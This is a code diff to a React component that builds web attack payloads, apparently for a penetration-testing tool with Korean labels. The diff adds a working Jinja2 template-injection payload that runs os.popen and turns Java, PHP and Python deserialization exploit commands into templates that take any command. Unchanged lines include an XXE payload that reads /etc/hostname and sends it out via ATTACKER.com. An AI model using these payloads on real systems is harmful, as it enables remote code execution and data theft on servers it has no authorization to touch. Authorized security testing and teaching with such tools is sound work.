@@ -1,5 +1,5 @@
 import { useState } from 'react'
-import { DISCLAIMER, Note, Pick, Readout, TextInput } from './shared'
+import { DISCLAIMER, Note, Pick, Readout, TextInput, escapeSingleQuoted } from './shared'
 
 type Engine = 'Jinja2' | 'Twig' | 'Freemarker' | 'Mako' | 'ERB'
 const ENGINES: Engine[] = ['Jinja2', 'Twig', 'Freemarker', 'Mako', 'ERB']
@@ -11,7 +11,7 @@ const SSTI_PAYLOADS: Record<Engine, { label: string; payloads: { desc: string; c
       { desc: '기본 수식 평가', code: '{{7*7}}' },
       { desc: '전역 설정 접근', code: '{{config.items()}}' },
       { desc: '클래스 계층 탐색 (RCE)', code: '{{ self.__class__.mro()[1].__subclasses__() }}' },
-      { desc: 'os.popen 실행 (필터 우회)', code: '{{ self.__dict__ }}' },
+      { desc: 'os.popen 실행 (cycler 경유 필터 우회)', code: "{{ cycler.__init__.__globals__.os.popen('id').read() }}" },
     ],
   },
   Twig: {
@@ -51,17 +51,18 @@ const XXE_PAYLOADS = [
   { id: 'oob', label: 'OOB Exfiltration (외부 리스너)', code: '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE root [\n  <!ENTITY % file SYSTEM "file:///etc/hostname">\n  <!ENTITY % dtd SYSTEM "http://ATTACKER.com/out.dtd">\n  %dtd;\n]>\n<root>&send;</root>' },
 ]
 
-const DESER_PAYLOADS = [
-  { lang: 'Java', tool: 'ysoserial', payload: 'CommonsCollections1', cmd: 'java -jar ysoserial.jar CommonsCollections1 "id" > payload.bin' },
-  { lang: 'Java', tool: 'ysoserial', payload: 'CommonsBeanutils1', cmd: 'java -jar ysoserial.jar CommonsBeanutils1 "id" > payload.bin' },
-  { lang: 'PHP', tool: 'phpggc', payload: 'Monolog', cmd: 'phpggc Monolog system "id"' },
-  { lang: 'Python', tool: 'pickle', payload: 'os.system', cmd: 'python3 -c "import pickle, os; print(pickle.dumps(lambda: os.system(\'id\')))"' },
+const DESER_PAYLOADS_TEMPLATES = [
+  { lang: 'Java', tool: 'ysoserial', payload: 'CommonsCollections1', cmd: (c: string) => `java -jar ysoserial.jar CommonsCollections1 "${c}" > payload.bin` },
+  { lang: 'Java', tool: 'ysoserial', payload: 'CommonsBeanutils1', cmd: (c: string) => `java -jar ysoserial.jar CommonsBeanutils1 "${c}" > payload.bin` },
+  { lang: 'PHP', tool: 'phpggc', payload: 'Monolog', cmd: (c: string) => `phpggc Monolog system "${c}"` },
+  { lang: 'Python', tool: 'pickle', payload: 'os.system', cmd: (c: string) => `python3 -c "import pickle, os; print(pickle.dumps(lambda: os.system('${escapeSingleQuoted(c)}')))"` },
 ]
 
 export function AdvancedPayloadBuilder() {
   const [tab, setTab] = useState<'ssti' | 'xxe' | 'deser'>('ssti')
   const [engine, setEngine] = useState<Engine>('Jinja2')
   const [collabUrl, setCollabUrl] = useState('')
+  const [deserCmd, setDeserCmd] = useState('id')
 
   return (
     <div className="payload-builder">
@@ -97,10 +98,11 @@ export function AdvancedPayloadBuilder() {
 
       {tab === 'deser' && (
         <div className="payload-builder-content">
+          <TextInput label="실행 명령" value={deserCmd} onChange={setDeserCmd} placeholder="id" />
           <p className="payload-builder-hint">역직렬화 페이로드는 바이너리 형태로 생성되므로, 도구 사용법과 가젯 체인 레퍼런스를 제공합니다.</p>
           <div className="payload-readout-group">
-            {DESER_PAYLOADS.map((p, i) => (
-              <Readout key={i} title={`${p.lang} (${p.tool} - ${p.payload})`} value={p.cmd} />
+            {DESER_PAYLOADS_TEMPLATES.map((p, i) => (
+              <Readout key={i} title={`${p.lang} (${p.tool} - ${p.payload})`} value={p.cmd(deserCmd)} />
             ))}
           </div>
         </div>
